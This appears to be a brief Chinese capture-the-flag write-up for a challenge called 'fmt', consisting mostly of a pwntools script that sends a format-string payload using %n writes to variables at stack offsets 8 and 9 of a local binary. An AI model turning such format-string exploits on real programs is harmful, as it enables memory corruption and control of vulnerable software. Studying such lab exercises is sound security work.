## fmt


***

出题人：xsh

![image-20240413224501590](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413224501590.png)

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = process('./fmt')
elf = ELF('./fmt')

#gdb.attach(p, 'b printf')

p.sendafter(b'> ', b'%18c%8$n%34c%9$n')

#pause()

p.interactive()


```

通过调试可以发现 a 和 b 的栈地址在偏移 8 和 9 的位置
